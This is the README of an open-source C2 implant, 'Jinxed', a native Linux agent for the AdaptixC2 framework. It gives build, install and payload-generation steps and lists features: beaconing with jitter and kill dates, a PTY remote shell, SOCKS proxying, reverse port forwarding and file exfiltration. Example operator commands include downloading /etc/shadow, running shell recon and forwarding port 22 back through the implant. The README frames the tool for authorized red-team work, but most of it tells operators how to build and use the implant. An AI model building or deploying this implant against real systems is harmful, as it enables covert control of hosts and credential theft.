# Jinxed — native Linux agent for AdaptixC2

A production-grade, **native POSIX** agent for the [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) command-and-control framework, packaged as a drop-in extender.

Jinxed re-implements the Adaptix *beacon* wire protocol for Linux instead of emulating Windows behaviour. Sessions, tasking, browsers, downloads, jobs, tunnels and the remote terminal all work through the stock teamserver and stock client; only the platform-specific primitives (BOF, token impersonation, SMB/TCP pivots, registry/WMI) are absent because POSIX has no equivalent.

```
   Adaptix client  ──►  Teamserver  ──►  BeaconHTTP listener  ──►  Jinxed agent
        │                  │                                            │
        └── jinxed_linux.axs│── agent_jinxed_linux.so ──────────────────┘
            (command tree)  └── profiles / pack / unpack / build
```

## Highlights

* **Byte-compatible protocol** — same opcodes, same RC4 crypto, same LE/BE framing as the shipped beacon. The teamserver cannot tell the difference; the GUI renders Linux sessions with native file and process browsers.
* **22 cross-platform commands + 8 Linux-native additions**, including asynchronous process jobs, PTY-backed remote terminals, chunked download/upload, SOCKS4a/SOCKS5 and bidirectional port forwarding.
* **Static, dependency-free agent** — pure Go standard library, `CGO_ENABLED=0`, cross-compiles to `amd64`, `arm64`, `386` and `arm`.
* **Real beacon behaviour** — sleep + jitter, working-time windows, kill date, interactive mode, output batching, immediate beacon when output is pending, per-session keys.
* **Verified end to end** — the repository ships an in-process protocol test that builds a real agent, runs it against a faithful listener implementation and exercises every command (see [Testing](#testing)). The extender has also been loaded by, and registered an agent with, a stock AdaptixC2 v1.2 teamserver.

## Feature matrix

| Capability | Windows beacon | Jinxed Linux |
| --- | :---: | :---: |
| HTTP(S) transport, proxy, URI/UA/Host rotation | ✅ | ✅ |
| TCP / SMB / DNS transports | ✅ | — (Windows-only transports) |
| Registration, session key, sleep/jitter/working-time/killdate | ✅ | ✅ |
| File browser (`ls`, `cat`, `cp`, `mv`, `rm`, `mkdir`, `chmod`, `pwd`, `cd`) | ✅ | ✅ |
| Process browser (`ps list`, `ps kill`, `ps run`) | ✅ | ✅ |
| Output-capturing process jobs, job list/kill | ✅ | ✅ |
| Remote shell / terminal | ✅ (`cmd.exe`) | ✅ (`/bin/sh`, real PTY) |
| Download with pause/resume/cancel | ✅ | ✅ |
| Upload (1 MiB staging) | ✅ | ✅ |
| SOCKS4a / SOCKS5 proxy, local & reverse port forwarding | ✅ | ✅ |
| Environment manager (`env`) | — | ✅ |
| Socket table (`netstat`), interfaces (`ifconfig`) | — | ✅ |
| Host metadata (`sysinfo`, `uname`, `users`) | partial | ✅ |
| Service control (`service`) | — | ✅ |
| BOF, token impersonation, pivots, registry, WMI, injection | ✅ | — |

The full audit — every discovered command, its opcode, its request/response layout and the reason for each exclusion — is in [`docs/COMMAND_MATRIX.md`](docs/COMMAND_MATRIX.md). The byte-level contract is in [`docs/PROTOCOL.md`](docs/PROTOCOL.md).

## Requirements

| Component | Version |
| --- | --- |
| AdaptixC2 teamserver | v1.2 (module `github.com/Adaptix-Framework/axc2 v1.2.0`) |
| Go toolchain | **exactly** the version used to build the teamserver (shipped v1.2 binary: `go1.25.4`, `GOEXPERIMENT=jsonv2,greenteagc`) |
| Build host | any Linux with the Go toolchain and `sh` |
| Target | Linux, `amd64` / `arm64` / `386` / `arm`; no libc required |

> **Why the exact toolchain?** Go plugins share the runtime and package build IDs with the host binary. A different Go version, `GOEXPERIMENT` set or `-trimpath` produces an unloadable plugin (`plugin was built with a different version of package …`). The bundled `Makefile` pins the values used by AdaptixC2 v1.2; override `GOEXPERIMENT=` if your server was built differently.

## Quick start

### 1. Build the extender

```bash
cd src/extender
make            # -> dist/agent_jinxed_linux.so, dist/config.yaml, dist/ax_config.axs, dist/src_agent/
```

`make` stages the agent source into `dist/src_agent` because `BuildPayload`
compiles payloads from that directory at runtime.

### 2. Install it into the teamserver

```bash
# from the directory that contains your teamserver profile.yaml
mkdir -p extenders/jinxed_linux
cp -r /path/to/jinxed-agent/src/extender/dist/* extenders/jinxed_linux/
```

Add the extender to `profile.yaml`:

```yaml
Teamserver:
  extenders:
    - "extenders/beacon_listener_http/config.yaml"
    - "extenders/jinxed_linux/config.yaml"      # <-- add this
```

Restart the teamserver. The startup log should not contain a `failed to open plugin` line, and clients receive the `jinxed_linux` command tree automatically (the teamserver distributes `ax_config.axs`).

### 3. Build a payload

In the Adaptix client: **Payloads → Create → `jinxed_linux`**, choose a
`BeaconHTTP` listener, architecture (`amd64`, `arm64`, `386`, `arm`), sleep,
jitter, optional kill date / working time, then **Build**. The extender
cross-compiles the agent on the teamserver host and returns a static ELF named
`jinxed_<arch>`.

Run it on the target:

```bash
chmod +x jinxed_amd64
./jinxed_amd64            # silent by default
./jinxed_amd64 -debug     # transport diagnostics on stderr
./jinxed_amd64 -version
```

The session appears in the client with the Linux hostname, distro, kernel and
architecture.

### Standalone agent build (no teamserver)

The agent compiles on its own, but a binary built from the checked-in
placeholder profile refuses to run (it has no listener configuration):

```bash
cd src/agent
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w" -o jinxed_amd64 .
./jinxed_amd64      # -> jinxed: embedded profile is missing or truncated
```

To produce a runnable payload manually, use the extender build path (it injects
the RC4 profile into `zz_profile_gen.go` before compiling). For CI or
troubleshooting you can build against a listener profile exported from a live
server:

```bash
cd src/extender
JINXED_LISTENER_JSON=/tmp/listener.json \
JINXED_AGENT_OUT=/tmp/jinxed_amd64 \
go test -run TestBuildPayloadFromListener -v .
```

## Command reference

Type `help` in a session console, or see the tables below. All commands use the
teamserver's normal argument parser (Tab-completion, validation, examples).

| Area | Commands |
| --- | --- |
| Files | `cat`, `cd`, `ls`, `pwd`, `cp`, `mv`, `rm`, `mkdir`, `chmod`, `disks` |
| Transfer | `download`, `upload`, `exfil start\|stop\|cancel <fid>` |
| Execution | `ps list`, `ps kill <pid>`, `ps run [-o] <cmd>`, `shell <cmd>`, `jobs list\|kill <id>` |
| Session | `getuid`, `sleep <time> [jitter]`, `profile killdate\|workingtime\|download.chunksize`, `terminate thread\|process`, `interact` |
| Tunnels | `socks start <port> [-h addr] [-socks4] [-auth user pass]`, `socks stop <port>`, `lportfwd start\|stop`, `rportfwd start\|stop` |
| Host | `sysinfo`, `uname`, `users`, `ifconfig`, `netstat`, `env list\|get\|set\|unset`, `service list\|status\|start\|stop\|restart\|enable\|disable` |

Examples:

```
jinxed_linux (10.10.14.7) » ls /etc
jinxed_linux (10.10.14.7) » cat /etc/os-release
jinxed_linux (10.10.14.7) » ps run -o /usr/bin/id
jinxed_linux (10.10.14.7) » shell uname -a; id; ss -lntp
jinxed_linux (10.10.14.7) » download /etc/shadow
jinxed_linux (10.10.14.7) » socks start 1080
jinxed_linux (10.10.14.7) » rportfwd start 4444 127.0.0.1 22
jinxed_linux (10.10.14.7) » sysinfo
jinxed_linux (10.10.14.7) » interact
```

`ps run` executes the command line directly (no implicit shell); `shell` wraps
it in `/bin/sh -c`. Both run in their own process group and can be stopped with
`jobs kill`.

## Repository layout

```
jinxed-agent/
├── client/jinxed_linux.axs     operator command tree, menus, payload UI
├── docs/                       command matrix, protocol, architecture
├── src/agent/                  standalone Linux agent (stdlib only)
├── src/extender/               Adaptix teamserver plugin (+ e2e test)
└── Makefile                    build / test / package helpers
```

## Building all artefacts

```bash
make            # extender plugin + staged dist/
make agent      # standalone agent for amd64 (placeholder profile)
make test       # full end-to-end protocol test
make clean
```

Cross-compilation of real payloads is performed by the extender at build time
with `GOOS=linux GOARCH=<arch> CGO_ENABLED=0`. Manual equivalent:

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath -buildvcs=false \
  -ldflags="-s -w" -o jinxed_arm64 .
```

## Testing

```bash
cd src/extender
go test -run TestEndToEnd -v .
```

Expected output:

```
=== RUN   TestEndToEnd
    e2e_test.go: built jinxed_amd64: 6512824 bytes
    e2e_test.go: listener up on 127.0.0.1:36791
    e2e_test.go: session: vader darth Kali GNU/Linux Rolling 6.18.12 amd64 x64
--- PASS: TestEndToEnd (78.29s)
```

The harness implements the BeaconHTTP handshake in-process (heartbeat header,
RC4, page templating), builds the agent with the production `BuildPayload`
path, runs it as a child process and asserts every command, including a
byte-exact 320 KB download and a live PTY session.

## Troubleshooting

| Symptom | Cause / fix |
| --- | --- |
| `plugin was built with a different version of package …` | Toolchain/flag mismatch. Rebuild with the teamserver's Go version and `GOEXPERIMENT`; **never** build the plugin with `-trimpath`. |
| `plugin.Open(...): realpath failed` | `extender_file` in `config.yaml` does not exist in the extender directory. |
| Payload build fails with `agent source not found` | `dist/src_agent` is missing — run `make` in `src/extender`, or set `JINXED_AGENT_SRC=/path/to/src/agent`. |
| Session registers but no commands work | Endianness or codepage regression. Verify `src/extender/pl_packer.go` parses **big-endian** agent output and `PackArray` writes **little-endian** task input. |
| Agent registers, then the page returns 404 to commands | The listener's `page-payload` was edited after the payload was built; rebuild the payload so the prefix/suffix lengths match. |
| Downloads stall | Check `profile download.chunksize` and that the teamserver can write to `data/download`. |
| Terminal shows no output | The target needs `/dev/ptmx` and `/dev/pts`; containers without a devpts mount fall back to `EPERM` on shell start (reported in the terminal). |
| `socks`/`lportfwd` connect but no data | Agent-side tunnel traffic uses the task-id field as a channel id; ensure the extender's `ProcessData` tunnel cases are intact. |

## Compatibility

| Item | Value |
| --- | --- |
| AdaptixC2 | v1.2 (v1.1 works with matching `axc2` and toolchain) |
| `axc2` module | `v1.2.0` |
| Agent watermark | `c0de11fe` |
| Listener types | `BeaconHTTP` |
| Agent OS reported | `OS_LINUX` (`2`), codepage 65001 (UTF-8) |
| Architectures | `amd64`, `arm64`, `386`, `arm` |

## Legal

This software is intended **exclusively** for authorized security testing,
red-team engagements, CTF environments and research on systems you own or have
explicit written permission to test. Unauthorized use against systems you do
not own is illegal in most jurisdictions.

Licensed under the GNU General Public License v3.0, matching AdaptixC2. See
[`LICENSE`](LICENSE).
